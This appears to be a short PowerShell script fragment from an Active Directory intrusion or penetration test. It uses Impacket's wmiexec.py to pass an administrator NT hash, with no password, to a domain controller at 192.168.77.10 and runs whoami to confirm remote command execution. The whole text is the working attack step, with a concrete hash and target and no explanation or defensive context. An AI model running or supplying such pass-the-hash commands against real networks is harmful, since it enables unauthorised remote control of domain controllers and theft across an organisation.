Write-Output "=== verify admin NT hash via wmiexec whoami on dc01 ==="
python "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\wmiexec.py" "cadre.local/administrator@192.168.77.10" -hashes aad3b435b51404eeaad3b435b51404ee:81c3b6443f148bf73bb3499791f1eb7b -no-pass whoami 2>&1 | Select-Object -First 15
